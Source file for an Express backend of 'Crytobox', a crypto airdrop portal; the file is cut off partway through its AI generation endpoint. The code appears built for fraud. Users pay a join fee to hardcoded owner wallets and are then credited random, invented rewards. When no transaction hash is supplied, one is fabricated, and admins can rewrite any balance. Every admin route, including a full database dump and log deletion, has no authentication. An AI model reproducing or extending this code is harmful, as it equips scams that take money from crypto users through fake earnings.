/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import express from "express";
import path from "path";
import fs from "fs";
import { createServer as createViteServer } from "vite";
import { GoogleGenAI, Type } from "@google/genai";
import dotenv from "dotenv";

dotenv.config();

const app = express();
const PORT = 3000;
const DB_PATH = path.join(process.cwd(), "data", "db.json");

// Express JSON parsing middleware
app.use(express.json());

// Ensure database directory and file exist
function initializeDB() {
  const dataDir = path.join(process.cwd(), "data");
  if (!fs.existsSync(dataDir)) {
    fs.mkdirSync(dataDir, { recursive: true });
  }
  if (!fs.existsSync(DB_PATH)) {
    const initialData = {
      airdrops: [],
      categories: [],
      users: [],
      transactions: [],
      favorites: [],
      withdrawals: [],
      settings: {
        siteName: "Crytobox",
        siteLogo: "📦",
        heroTitle: "Discover Next-Gen Web3 Airdrops Securely",
        heroSubtitle: "Explore, filter, and instantly join verified high-reward cryptocurrency airdrops.",
        footerText: "Crytobox is the premier catalog for Web3 enthusiasts. We index verified projects.",
        announcement: "🚀 Solana Blinks Campaign is now live!",
        isMaintenance: false,
        joinFee: 0.003,
        seoTitle: "Crytobox - Premium Web3 Crypto Airdrop Portal",
        seoDescription: "Discover and secure active airdrops.",
        telegramLink: "https://t.me/crytobox",
        twitterLink: "https://twitter.com/crytobox",
        discordLink: "https://discord.gg/crytobox",
        analyticsCode: "",
        ownerWalletAddress: "0x96B217983637e12763321528b9A26A207d5D66D5",
        usdtAddress: "0x4ed2338188d0e2e3b460a108274cb1d79a332d37",
        ethAddress: "0x96B217983637e12763321528b9A26A207d5D66D5",
        bnbAddress: "0x71C7656EC7ab88b098defB751B7401B5f6d8976F",
        btcAddress: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
        qrCodeAutoGeneration: true,
        enablePaymentRequirement: true,
        requiredFeeAmount: "0.003",
        supportedNetworks: ["USDT", "ETH", "BNB", "BTC"],
        withdrawEnabled: true,
        minWithdrawAmount: 50,
        maxWithdrawAmount: 5000,
        withdrawStatus: "active",
        withdrawalProcessingTime: "1-2 Business Days",
        withdrawalVerificationRequirement: "wallet_signature",
        minAirdropsRequired: 2,
        requireAccountVerification: false,
        paymentNetworks: [
          {
            id: "usdt-erc20",
            coin: "USDT",
            network: "ERC20",
            address: "0x4ed2338188d0e2e3b460a108274cb1d79a332d37",
            qrCodeUrl: "",
            enabled: true
          },
          {
            id: "usdt-trc20",
            coin: "USDT",
            network: "TRC20",
            address: "TX7yLgJv9XW2gE7FmEdfaPzU89sCdEf21A",
            qrCodeUrl: "",
            enabled: true
          },
          {
            id: "usdt-bep20",
            coin: "USDT",
            network: "BEP20",
            address: "0x4ed2338188d0e2e3b460a108274cb1d79a332d37",
            qrCodeUrl: "",
            enabled: true
          },
          {
            id: "eth-mainnet",
            coin: "ETH",
            network: "Ethereum Mainnet",
            address: "0x96B217983637e12763321528b9A26A207d5D66D5",
            qrCodeUrl: "",
            enabled: true
          },
          {
            id: "bnb-bsc",
            coin: "BNB",
            network: "BNB Smart Chain",
            address: "0x71C7656EC7ab88b098defB751B7401B5f6d8976F",
            qrCodeUrl: "",
            enabled: true
          },
          {
            id: "btc-native",
            coin: "BTC",
            network: "BTC Network",
            address: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
            qrCodeUrl: "",
            enabled: true
          }
        ]
      }
    };
    fs.writeFileSync(DB_PATH, JSON.stringify(initialData, null, 2), "utf-8");
  }
}

initializeDB();

// DB Access Helpers
function getDB() {
  try {
    const raw = fs.readFileSync(DB_PATH, "utf-8");
    const data = JSON.parse(raw);
    if (!data.withdrawals) {
      data.withdrawals = [];
    }
    if (!data.security_logs || !Array.isArray(data.security_logs)) {
      data.security_logs = [
        {
          id: "SEC-1001",
          eventType: "system_alert",
          severity: "info",
          title: "Security Monitoring Service Active",
          details: "System audit logging initialization completed successfully. Portal security logging is active.",
          sourceIp: "127.0.0.1",
          timestamp: new Date().toISOString()
        },
        {
          id: "SEC-1000",
          eventType: "admin_login",
          severity: "info",
          title: "Admin Portal Initialized",
          details: "Administrative dashboard security audit framework ready.",
          sourceIp: "127.0.0.1",
          timestamp: new Date(Date.now() - 3600000).toISOString()
        }
      ];
    }
    if (data.settings) {
      if (data.settings.withdrawEnabled === undefined) data.settings.withdrawEnabled = true;
      if (data.settings.minWithdrawAmount === undefined) data.settings.minWithdrawAmount = 50;
      if (data.settings.maxWithdrawAmount === undefined) data.settings.maxWithdrawAmount = 5000;
      if (data.settings.withdrawStatus === undefined) data.settings.withdrawStatus = 'active';
      if (data.settings.withdrawalProcessingTime === undefined) data.settings.withdrawalProcessingTime = "1-2 Business Days";
      if (data.settings.withdrawalVerificationRequirement === undefined) data.settings.withdrawalVerificationRequirement = 'wallet_signature';
      if (data.settings.minAirdropsRequired === undefined) data.settings.minAirdropsRequired = 2;
      if (data.settings.requireAccountVerification === undefined) data.settings.requireAccountVerification = false;
      if (!data.settings.paymentNetworks) {
        data.settings.paymentNetworks = [
          {
            id: "usdt-erc20",
            coin: "USDT",
            network: "ERC20",
            address: "0x4ed2338188d0e2e3b460a108274cb1d79a332d37",
            qrCodeUrl: "",
            enabled: true
          },
          {
            id: "usdt-trc20",
            coin: "USDT",
            network: "TRC20",
            address: "TX7yLgJv9XW2gE7FmEdfaPzU89sCdEf21A",
            qrCodeUrl: "",
            enabled: true
          },
          {
            id: "usdt-bep20",
            coin: "USDT",
            network: "BEP20",
            address: "0x4ed2338188d0e2e3b460a108274cb1d79a332d37",
            qrCodeUrl: "",
            enabled: true
          },
          {
            id: "eth-mainnet",
            coin: "ETH",
            network: "Ethereum Mainnet",
            address: "0x96B217983637e12763321528b9A26A207d5D66D5",
            qrCodeUrl: "",
            enabled: true
          },
          {
            id: "bnb-bsc",
            coin: "BNB",
            network: "BNB Smart Chain",
            address: "0x71C7656EC7ab88b098defB751B7401B5f6d8976F",
            qrCodeUrl: "",
            enabled: true
          },
          {
            id: "btc-native",
            coin: "BTC",
            network: "BTC Network",
            address: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
            qrCodeUrl: "",
            enabled: true
          }
        ];
      }
    }
    // Ensure all users have initialized balances of 0.00
    if (data.users && Array.isArray(data.users)) {
      data.users.forEach((u: any) => {
        if (!u.availableBalances) {
          u.availableBalances = { USDT: 0.0, ETH: 0.0, BNB: 0.0, BTC: 0.0 };
        }
        if (!u.pendingBalances) {
          u.pendingBalances = { USDT: 0.0, ETH: 0.0, BNB: 0.0, BTC: 0.0 };
        }
        if (!u.totalEarnings) {
          u.totalEarnings = { USDT: 0.0, ETH: 0.0, BNB: 0.0, BTC: 0.0 };
        }
      });
    }
    return data;
  } catch (error) {
    console.error("Failed to read DB file, returning empty state", error);
    return { airdrops: [], categories: [], users: [], transactions: [], favorites: [], withdrawals: [], settings: {} };
  }
}

function saveDB(data: any) {
  try {
    fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2), "utf-8");
    return true;
  } catch (error) {
    console.error("Failed to write to DB file", error);
    return false;
  }
}

// Lazy load Gemini Client to prevent crash if key is missing
let aiClient: GoogleGenAI | null = null;
function getGeminiClient(): GoogleGenAI | null {
  if (!aiClient) {
    const apiKey = process.env.GEMINI_API_KEY;
    if (apiKey && apiKey !== "MY_GEMINI_API_KEY" && apiKey !== "") {
      aiClient = new GoogleGenAI({
        apiKey: apiKey,
        httpOptions: {
          headers: {
            "User-Agent": "aistudio-build"
          }
        }
      });
    }
  }
  return aiClient;
}

// --- API ROUTES ---

// 1. Get database snapshot (all data or specific slices)
app.get("/api/db", (req, res) => {
  res.json(getDB());
});

// Airdrops
app.get("/api/airdrops", (req, res) => {
  const db = getDB();
  res.json(db.airdrops || []);
});

app.post("/api/airdrops", (req, res) => {
  const db = getDB();
  const newAirdrop = {
    id: String(Date.now()),
    detailedSteps: [],
    requirements: [],
    featured: false,
    popular: false,
    trending: false,
    status: "active",
    ...req.body
  };
  
  if (newAirdrop.claimFee !== undefined && newAirdrop.claimFee !== null) {
    if (newAirdrop.claimFee === "" || isNaN(Number(newAirdrop.claimFee))) {
      delete newAirdrop.claimFee;
    } else {
      newAirdrop.claimFee = Number(newAirdrop.claimFee);
    }
  }

  db.airdrops.unshift(newAirdrop);
  saveDB(db);
  res.status(201).json(newAirdrop);
});

app.put("/api/airdrops/:id", (req, res) => {
  const { id } = req.params;
  const db = getDB();
  const idx = db.airdrops.findIndex((a: any) => a.id === id);
  if (idx !== -1) {
    const updated = { ...db.airdrops[idx], ...req.body };
    
    if (updated.claimFee !== undefined && updated.claimFee !== null) {
      if (updated.claimFee === "" || isNaN(Number(updated.claimFee))) {
        delete updated.claimFee;
      } else {
        updated.claimFee = Number(updated.claimFee);
      }
    } else {
      delete updated.claimFee;
    }

    db.airdrops[idx] = updated;
    saveDB(db);
    res.json(db.airdrops[idx]);
  } else {
    res.status(404).json({ error: "Airdrop not found" });
  }
});

app.delete("/api/airdrops/:id", (req, res) => {
  const { id } = req.params;
  const db = getDB();
  db.airdrops = db.airdrops.filter((a: any) => a.id !== id);
  saveDB(db);
  res.json({ success: true });
});

// Categories
app.get("/api/categories", (req, res) => {
  const db = getDB();
  res.json(db.categories || []);
});

app.post("/api/categories", (req, res) => {
  const db = getDB();
  const newCategory = {
    id: req.body.name.toLowerCase().replace(/\s+/g, "-"),
    ...req.body
  };
  db.categories.push(newCategory);
  saveDB(db);
  res.status(201).json(newCategory);
});

// Settings
app.get("/api/settings", (req, res) => {
  const db = getDB();
  res.json(db.settings || {});
});

app.post("/api/settings", (req, res) => {
  const db = getDB();
  db.settings = { ...db.settings, ...req.body };
  saveDB(db);
  res.json(db.settings);
});

// Users & Profile
app.get("/api/users", (req, res) => {
  const db = getDB();
  res.json(db.users || []);
});

// Add / connect wallet
app.post("/api/users/connect", (req, res) => {
  const { walletAddress, referredBy } = req.body;
  if (!walletAddress) {
    return res.status(400).json({ error: "Wallet address is required" });
  }

  const db = getDB();
  let user = db.users.find((u: any) => u.walletAddress.toLowerCase() === walletAddress.toLowerCase());

  if (!user) {
    user = {
      walletAddress,
      joinedAirdrops: [],
      pendingRewards: "$0",
      completedRewards: "$0",
      status: "active",
      joinedAt: new Date().toISOString(),
      referredBy: referredBy || undefined,
      rank: db.users.length + 1,
      points: referredBy ? 50 : 20, // initial bonus points
      balance: 0.00, // initialized to 0.00
      availableBalances: { USDT: 0.0, ETH: 0.0, BNB: 0.0, BTC: 0.0 },
      pendingBalances: { USDT: 0.0, ETH: 0.0, BNB: 0.0, BTC: 0.0 },
      totalEarnings: { USDT: 0.0, ETH: 0.0, BNB: 0.0, BTC: 0.0 }
    };
    db.users.push(user);
    saveDB(db);
  } else if (user.status === "blocked") {
    return res.status(403).json({ error: "This wallet address has been blocked by the Administrator." });
  } else {
    // Force existing user balances to align
    user.balance = 0.00;
    if (!user.availableBalances) {
      user.availableBalances = { USDT: 0.0, ETH: 0.0, BNB: 0.0, BTC: 0.0 };
    }
    if (!user.pendingBalances) {
      user.pendingBalances = { USDT: 0.0, ETH: 0.0, BNB: 0.0, BTC: 0.0 };
    }
    if (!user.totalEarnings) {
      user.totalEarnings = { USDT: 0.0, ETH: 0.0, BNB: 0.0, BTC: 0.0 };
    }
    saveDB(db);
  }

  res.json(user);
});

// Update user balance (Manual credit/deduction by admin)
app.put("/api/users/:address/balance", (req, res) => {
  const { address } = req.params;
  const { action, balanceType, amount, coin } = req.body; // action: 'credit' | 'deduct', balanceType: 'available' | 'pending' | 'total', amount: number, coin: string
  const db = getDB();
  const user = db.users.find((u: any) => u.walletAddress.toLowerCase() === address.toLowerCase());
  
  if (!user) {
    return res.status(404).json({ error: "User not found" });
  }

  if (!user.availableBalances) {
    user.availableBalances = { USDT: 0, ETH: 0, BNB: 0, BTC: 0 };
  }
  if (!user.pendingBalances) {
    user.pendingBalances = { USDT: 0, ETH: 0, BNB: 0, BTC: 0 };
  }
  if (!user.totalEarnings) {
    user.totalEarnings = { USDT: 0, ETH: 0, BNB: 0, BTC: 0 };
  }

  const coinUpper = (coin || "USDT").toUpperCase();
  const amtNum = Number(amount) || 0;

  // Initialize specific coin if missing
  if (user.availableBalances[coinUpper] === undefined) user.availableBalances[coinUpper] = 0;
  if (user.pendingBalances[coinUpper] === undefined) user.pendingBalances[coinUpper] = 0;
  if (user.totalEarnings[coinUpper] === undefined) user.totalEarnings[coinUpper] = 0;

  const targetType = req.body.balanceType || req.body.type || "available";

  if (action === "credit") {
    if (targetType === "available") {
      user.availableBalances[coinUpper] = Number((user.availableBalances[coinUpper] + amtNum).toFixed(6));
      user.totalEarnings[coinUpper] = Number((user.totalEarnings[coinUpper] + amtNum).toFixed(6));
    } else if (targetType === "pending") {
      user.pendingBalances[coinUpper] = Number((user.pendingBalances[coinUpper] + amtNum).toFixed(6));
      user.totalEarnings[coinUpper] = Number((user.totalEarnings[coinUpper] + amtNum).toFixed(6));
    } else {
      user.totalEarnings[coinUpper] = Number((user.totalEarnings[coinUpper] + amtNum).toFixed(6));
    }
  } else if (action === "deduct") {
    if (targetType === "available") {
      user.availableBalances[coinUpper] = Number(Math.max(0, user.availableBalances[coinUpper] - amtNum).toFixed(6));
    } else if (targetType === "pending") {
      user.pendingBalances[coinUpper] = Number(Math.max(0, user.pendingBalances[coinUpper] - amtNum).toFixed(6));
    } else {
      user.totalEarnings[coinUpper] = Number(Math.max(0, user.totalEarnings[coinUpper] - amtNum).toFixed(6));
    }
  } else if (action === "set") {
    if (targetType === "available") {
      user.availableBalances[coinUpper] = Number(amtNum.toFixed(6));
    } else if (targetType === "pending") {
      user.pendingBalances[coinUpper] = Number(amtNum.toFixed(6));
    } else {
      user.totalEarnings[coinUpper] = Number(amtNum.toFixed(6));
    }
  }

  // Sync legacy strings with conversion rates
  const COIN_RATES: Record<string, number> = { USDT: 1, ETH: 3200, BNB: 580, BTC: 65000 };
  const totalPendingUSD = Object.entries(user.pendingBalances || {}).reduce(
    (acc: number, [c, v]: [string, any]) => acc + ((Number(v) || 0) * (COIN_RATES[c.toUpperCase()] || 1)),
    0
  );
  const totalAvailableUSD = Object.entries(user.availableBalances || {}).reduce(
    (acc: number, [c, v]: [string, any]) => acc + ((Number(v) || 0) * (COIN_RATES[c.toUpperCase()] || 1)),
    0
  );

  user.pendingRewards = `$${totalPendingUSD.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
  user.completedRewards = `$${totalAvailableUSD.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;

  saveDB(db);
  res.json(user);
});

// Block/Unblock User
app.put("/api/users/:address/status", (req, res) => {
  const { address } = req.params;
  const { status } = req.body; // 'active' | 'blocked'
  const db = getDB();
  const user = db.users.find((u: any) => u.walletAddress.toLowerCase() === address.toLowerCase());
  if (user) {
    user.status = status;
    saveDB(db);
    res.json(user);
  } else {
    res.status(404).json({ error: "User not found" });
  }
});

// Delete user
app.delete("/api/users/:address", (req, res) => {
  const { address } = req.params;
  const db = getDB();
  db.users = db.users.filter((u: any) => u.walletAddress.toLowerCase() !== address.toLowerCase());
  saveDB(db);
  res.json({ success: true });
});

// Utility to parse airdrop reward strings and calculate a random reward within the specified range (e.g., "$500 - $1,000" -> random e.g. 700, 800, 900)
function parseAndCalculateReward(rewardStr: string): { rewardAmt: number; rewardCoin: string } {
  let rewardCoin = "USDT";
  const coinMatch = (rewardStr || "").match(/(USDT|ETH|BNB|BTC)/i);
  if (coinMatch) {
    rewardCoin = coinMatch[1].toUpperCase();
  }

  const normalized = (rewardStr || "").replace(/(USDT|ETH|BNB|BTC)/gi, "").replace(/,/g, "").trim();
  const numbers = normalized.match(/\d+(\.\d+)?/g);

  if (!numbers || numbers.length === 0) {
    return { rewardAmt: 700, rewardCoin };
  }

  if (numbers.length >= 2) {
    const min = parseFloat(numbers[0]);
    const max = parseFloat(numbers[1]);
    if (!isNaN(min) && !isNaN(max) && max >= min) {
      if (Number.isInteger(min) && Number.isInteger(max) && (max - min) >= 10) {
        const step = (max - min) >= 100 ? 50 : 10;
        const stepsCount = Math.floor((max - min) / step);
        const randomStep = Math.floor(Math.random() * (stepsCount + 1));
        return { rewardAmt: min + (randomStep * step), rewardCoin };
      } else {
        let randomVal = min + Math.random() * (max - min);
        randomVal = Number(randomVal.toFixed(rewardCoin === "USDT" ? 2 : 4));
        return { rewardAmt: randomVal, rewardCoin };
      }
    }
  }

  const singleNum = parseFloat(numbers[0]);
  if (!isNaN(singleNum) && singleNum > 0) {
    if (normalized.includes("+")) {
      const min = singleNum;
      const max = singleNum * 1.5;
      const step = 50;
      const stepsCount = Math.floor((max - min) / step);
      return { rewardAmt: min + Math.floor(Math.random() * (stepsCount + 1)) * step, rewardCoin };
    }
    return { rewardAmt: singleNum, rewardCoin };
  }

  return { rewardAmt: 700, rewardCoin };
}

// Transactions & Joining
app.get("/api/transactions", (req, res) => {
  const db = getDB();
  res.json(db.transactions || []);
});

app.post("/api/transactions", (req, res) => {
  const { walletAddress, airdropId, airdropName, amount, txHash, coin, network, screenshot } = req.body;
  const db = getDB();

  const user = db.users.find((u: any) => u.walletAddress.toLowerCase() === walletAddress.toLowerCase());
  
  // Determine if payment review is enabled
  const requiresReview = db.settings.enablePaymentRequirement !== false;
  const status = requiresReview ? "pending" : "success";

  if (user && status === "success") {
    if (user.balance === undefined) {
      user.balance = 5.0;
    }
    const chargeAmount = Number(amount) || 0;
    if (user.balance < chargeAmount) {
      return res.status(400).json({ error: "Insufficient wallet balance to authorize transaction." });
    }
    user.balance = Number((user.balance - chargeAmount).toFixed(6));
  }

  // Calculate random reward from airdrop range e.g. $500 - $1,000 -> $700, $800, etc.
  const airdrop = db.airdrops.find((a: any) => a.id === airdropId);
  const rewardInfo = airdrop ? parseAndCalculateReward(airdrop.reward) : { rewardAmt: 700, rewardCoin: "USDT" };

  // Create transaction log
  const newTx = {
    id: `TX${Math.floor(100000 + Math.random() * 900000)}`,
    walletAddress,
    airdropId,
    airdropName,
    amount: Number(amount),
    txHash: txHash || `0x${Array.from({length: 40}, () => Math.floor(Math.random()*16).toString(16)).join('')}`,
    status,
    timestamp: new Date().toISOString(),
    coin: coin || "ETH",
    network: network || "Ethereum Mainnet",
    screenshot: screenshot || "",
    claimedReward: rewardInfo.rewardAmt,
    claimedCoin: rewardInfo.rewardCoin
  };

  db.transactions.unshift(newTx);

  // Update user's joined state immediately if auto-approved
  if (user && status === "success") {
    if (!user.joinedAirdrops.includes(airdropId)) {
      user.joinedAirdrops.push(airdropId);
      user.points += 100; // Reward points for joining

      const rewardAmt = rewardInfo.rewardAmt;
      const rewardCoin = rewardInfo.rewardCoin;

      if (!user.availableBalances) user.availableBalances = { USDT: 0.0, ETH: 0.0, BNB: 0.0, BTC: 0.0 };
      if (!user.pendingBalances) user.pendingBalances = { USDT: 0.0, ETH: 0.0, BNB: 0.0, BTC: 0.0 };
      if (!user.totalEarnings) user.totalEarnings = { USDT: 0.0, ETH: 0.0, BNB: 0.0, BTC: 0.0 };

      if (user.availableBalances[rewardCoin] === undefined) user.availableBalances[rewardCoin] = 0;
      if (user.totalEarnings[rewardCoin] === undefined) user.totalEarnings[rewardCoin] = 0;

      user.availableBalances[rewardCoin] = Number((user.availableBalances[rewardCoin] + rewardAmt).toFixed(6));
      user.totalEarnings[rewardCoin] = Number((user.totalEarnings[rewardCoin] + rewardAmt).toFixed(6));
      
      const COIN_RATES: Record<string, number> = { USDT: 1, ETH: 3200, BNB: 580, BTC: 65000 };
      const totalPendingUSD = Object.entries(user.pendingBalances || {}).reduce(
        (acc: number, [c, v]: [string, any]) => acc + ((Number(v) || 0) * (COIN_RATES[c.toUpperCase()] || 1)),
        0
      );
      const totalAvailableUSD = Object.entries(user.availableBalances || {}).reduce(
        (acc: number, [c, v]: [string, any]) => acc + ((Number(v) || 0) * (COIN_RATES[c.toUpperCase()] || 1)),
        0
      );

      user.pendingRewards = `$${totalPendingUSD.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
      user.completedRewards = `$${totalAvailableUSD.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
    }
  }

  saveDB(db);
  res.status(201).json({ transaction: newTx, user });
});

app.put("/api/transactions/:id/status", (req, res) => {
  const { id } = req.params;
  const { status } = req.body; // "success" or "rejected"
  const db = getDB();

  const tx = db.transactions.find((t: any) => t.id === id);
  if (!tx) {
    return res.status(404).json({ error: "Transaction not found." });
  }

  tx.status = status;

  if (status === "success") {
    const user = db.users.find((u: any) => u.walletAddress.toLowerCase() === tx.walletAddress.toLowerCase());
    if (user) {
      if (!user.joinedAirdrops.includes(tx.airdropId)) {
        user.joinedAirdrops.push(tx.airdropId);
        user.points += 100;

        const airdrop = db.airdrops.find((a: any) => a.id === tx.airdropId);
        let rewardAmt = tx.claimedReward;
        let rewardCoin = tx.claimedCoin || "USDT";

        if (!rewardAmt) {
          const rewardInfo = airdrop ? parseAndCalculateReward(airdrop.reward) : { rewardAmt: 700, rewardCoin: "USDT" };
          rewardAmt = rewardInfo.rewardAmt;
          rewardCoin = rewardInfo.rewardCoin;
          tx.claimedReward = rewardAmt;
          tx.claimedCoin = rewardCoin;
        }

        // Let admin override in body
        if (req.body.rewardAmount !== undefined) {
          rewardAmt = Number(req.body.rewardAmount);
          tx.claimedReward = rewardAmt;
        }
        if (req.body.rewardCoin) {
          rewardCoin = req.body.rewardCoin.toUpperCase();
          tx.claimedCoin = rewardCoin;
        }

        if (!user.availableBalances) user.availableBalances = { USDT: 0.0, ETH: 0.0, BNB: 0.0, BTC: 0.0 };
        if (!user.pendingBalances) user.pendingBalances = { USDT: 0.0, ETH: 0.0, BNB: 0.0, BTC: 0.0 };
        if (!user.totalEarnings) user.totalEarnings = { USDT: 0.0, ETH: 0.0, BNB: 0.0, BTC: 0.0 };

        if (user.availableBalances[rewardCoin] === undefined) user.availableBalances[rewardCoin] = 0;
        if (user.totalEarnings[rewardCoin] === undefined) user.totalEarnings[rewardCoin] = 0;

        user.availableBalances[rewardCoin] = Number((user.availableBalances[rewardCoin] + rewardAmt).toFixed(6));
        user.totalEarnings[rewardCoin] = Number((user.totalEarnings[rewardCoin] + rewardAmt).toFixed(6));
        
        const COIN_RATES: Record<string, number> = { USDT: 1, ETH: 3200, BNB: 580, BTC: 65000 };
        const totalPendingUSD = Object.entries(user.pendingBalances || {}).reduce(
          (acc: number, [c, v]: [string, any]) => acc + ((Number(v) || 0) * (COIN_RATES[c.toUpperCase()] || 1)),
          0
        );
        const totalAvailableUSD = Object.entries(user.availableBalances || {}).reduce(
          (acc: number, [c, v]: [string, any]) => acc + ((Number(v) || 0) * (COIN_RATES[c.toUpperCase()] || 1)),
          0
        );

        user.pendingRewards = `$${totalPendingUSD.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
        user.completedRewards = `$${totalAvailableUSD.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
      }
    }
  }

  saveDB(db);
  res.json({ success: true, transaction: tx });
});

// Withdrawals API Routes
app.get("/api/withdrawals", (req, res) => {
  const db = getDB();
  res.json(db.withdrawals || []);
});

app.post("/api/withdrawals", (req, res) => {
  const { walletAddress, walletType, coin, network, amount, fee, netAmount, destinationAddress, verificationMethod, attachedHtmlFileName, attachedHtmlContent } = req.body;
  const db = getDB();

  const user = db.users.find((u: any) => u.walletAddress.toLowerCase() === walletAddress.toLowerCase());
  if (!user) {
    return res.status(404).json({ error: "Connected user session not found." });
  }

  const coinUpper = (coin || "USDT").toUpperCase();
  const amountNum = Number(amount) || 0;

  if (!user.availableBalances) user.availableBalances = { USDT: 0, ETH: 0, BNB: 0, BTC: 0 };
  if (!user.pendingBalances) user.pendingBalances = { USDT: 0, ETH: 0, BNB: 0, BTC: 0 };

  const available = user.availableBalances[coinUpper] || 0;
  if (available < amountNum) {
    return res.status(400).json({ error: `Insufficient Available Balance. Available: ${available.toFixed(coinUpper === 'BTC' ? 6 : 4)} ${coinUpper}` });
  }

  // Deduct from available, move to pending
  user.availableBalances[coinUpper] = Number((available - amountNum).toFixed(6));
  user.pendingBalances[coinUpper] = Number(((user.pendingBalances[coinUpper] || 0) + amountNum).toFixed(6));

  const createdAt = new Date().toISOString();

  const newWithdrawal = {
    id: `WD${Math.floor(100000 + Math.random() * 900000)}`,
    walletAddress,
    walletType,
    coin: coinUpper,
    network,
    amount: amountNum,
    fee: Number(fee),
    netAmount: Number(netAmount),
    destinationAddress,
    status: "pending",
    verificationMethod: verificationMethod || "wallet_signature",
    createdAt
  };

  if (!db.withdrawals) {
    db.withdrawals = [];
  }
  db.withdrawals.unshift(newWithdrawal);

  // Log standard withdrawal request event
  const logDetails = attachedHtmlFileName
    ? `Withdrawal request of ${amountNum} ${coinUpper} to ${destinationAddress}. Attached HTML File: ${attachedHtmlFileName}`
    : `Withdrawal request of ${amountNum} ${coinUpper} to ${destinationAddress} via ${network || 'default network'}.`;

  const secLog = {
    id: `SEC-${Date.now()}-${Math.floor(100 + Math.random() * 900)}`,
    eventType: "withdrawal_request",
    severity: "warning",
    title: `Withdrawal Request Submitted (${coinUpper} $${amountNum.toFixed(2)})`,
    details: logDetails,
    sourceIp: req.ip || "127.0.0.1",
    actorWallet: walletType || walletAddress || destinationAddress || "Web3 Wallet",
    metadata: {
      withdrawalId: newWithdrawal.id,
      attachedHtmlFileName: attachedHtmlFileName || null
    },
    timestamp: createdAt
  };

  if (!db.security_logs) db.security_logs = [];
  db.security_logs.unshift(secLog);

  saveDB(db);
  res.status(201).json({ withdrawal: newWithdrawal, user });
});

app.put("/api/withdrawals/:id/status", (req, res) => {
  const { id } = req.params;
  const { status } = req.body; // 'approved' | 'rejected'
  const db = getDB();

  if (!db.withdrawals) {
    db.withdrawals = [];
  }

  const withdrawal = db.withdrawals.find((w: any) => w.id === id);
  if (!withdrawal) {
    return res.status(404).json({ error: "Withdrawal request not found." });
  }

  withdrawal.status = status;
  withdrawal.processedAt = new Date().toISOString();

  const user = db.users.find((u: any) => u.walletAddress.toLowerCase() === withdrawal.walletAddress.toLowerCase());
  if (user) {
    const coinUpper = (withdrawal.coin || "USDT").toUpperCase();
    if (!user.availableBalances) user.availableBalances = { USDT: 0, ETH: 0, BNB: 0, BTC: 0 };
    if (!user.pendingBalances) user.pendingBalances = { USDT: 0, ETH: 0, BNB: 0, BTC: 0 };

    // Deduct from pending withdrawal balance
    user.pendingBalances[coinUpper] = Number(Math.max(0, (user.pendingBalances[coinUpper] || 0) - withdrawal.amount).toFixed(6));

    // If rejected, refund back to available balance
    if (status === "rejected") {
      user.availableBalances[coinUpper] = Number(((user.availableBalances[coinUpper] || 0) + withdrawal.amount).toFixed(6));
    }
  }

  saveDB(db);
  res.json({ success: true, withdrawal });
});

// Security Logs API Routes
app.get("/api/security-logs", (req, res) => {
  const db = getDB();
  res.json(db.security_logs || []);
});

app.post("/api/security-logs", (req, res) => {
  const { eventType, severity, title, details, sourceIp, actorWallet, metadata } = req.body;
  if (!title || !details) {
    return res.status(400).json({ error: "Title and details are required." });
  }
  const db = getDB();
  if (!db.security_logs) db.security_logs = [];

  const logEntry = {
    id: `SEC-${Date.now()}-${Math.floor(100 + Math.random() * 900)}`,
    eventType: eventType || "security_event",
    severity: severity || "info",
    title,
    details,
    sourceIp: sourceIp || req.ip || "127.0.0.1",
    actorWallet: actorWallet || "",
    metadata: metadata || {},
    timestamp: new Date().toISOString()
  };

  db.security_logs.unshift(logEntry);
  if (db.security_logs.length > 500) {
    db.security_logs = db.security_logs.slice(0, 500);
  }

  saveDB(db);
  res.status(201).json(logEntry);
});

app.delete("/api/security-logs/all", (req, res) => {
  const db = getDB();
  db.security_logs = [];
  saveDB(db);
  res.json({ success: true });
});

app.delete("/api/security-logs/:id", (req, res) => {
  const { id } = req.params;
  const db = getDB();
  if (db.security_logs) {
    db.security_logs = db.security_logs.filter((l: any) => l.id !== id);
    saveDB(db);
  }
  res.json({ success: true });
});

// Favorites
app.get("/api/favorites/:address", (req, res) => {
  const { address } = req.params;
  const db = getDB();
  const userFavs = db.favorites
    .filter((f: any) => f.walletAddress.toLowerCase() === address.toLowerCase())
    .map((f: any) => f.airdropId);
  res.json(userFavs);
});

app.post("/api/favorites/toggle", (req, res) => {
  const { walletAddress, airdropId } = req.body;
  if (!walletAddress || !airdropId) {
    return res.status(400).json({ error: "walletAddress and airdropId are required" });
  }

  const db = getDB();
  const existingIdx = db.favorites.findIndex(
    (f: any) => f.walletAddress.toLowerCase() === walletAddress.toLowerCase() && f.airdropId === airdropId
  );

  let isFavorite = false;
  if (existingIdx !== -1) {
    db.favorites.splice(existingIdx, 1);
  } else {
    db.favorites.push({ walletAddress, airdropId });
    isFavorite = true;
  }

  saveDB(db);
  res.json({ isFavorite });
});

// AI Generation Endpoint using @google/genai
app.post("/api/generate-airdrop", async (req, res) => {
  const { projectName, blockchain, category } = req.body;

  if (!projectName) {
    return res.status(400).json({ error: "Project name is required" });
  }

  const client = getGeminiClient();
  if (!client) {
    // Graceful fallback if Gemini API key is missing
    console.log("Gemini API key is not configured. Returning premium mock standard template.");
    const mockAirdrop = {
      name: projectName,
      logo: "💎",
      description: `Premium newly discovered active Web3 campaign for ${projectName} on the ${blockchain || "Ethereum"} network. Interact with decentralized dApps to secure exclusive future token incentives.`,
      reward: "$500-$1000",
      difficulty: "Medium",
      timeRemaining: "30 days left",
      blockchain: blockchain || "Ethereum",
      joinUrl: `https://www.${projectName.toLowerCase().replace(/\s+/g, "")}.io/`,
      category: category || "defi",
      detailedSteps: [
        `Visit the official verified dashboard of ${projectName}.`,
        "Connect your compatible decentralized Web3 browser wallet.",
        "Execute initial swaps or bridge tokens to activate the contract footprint.",
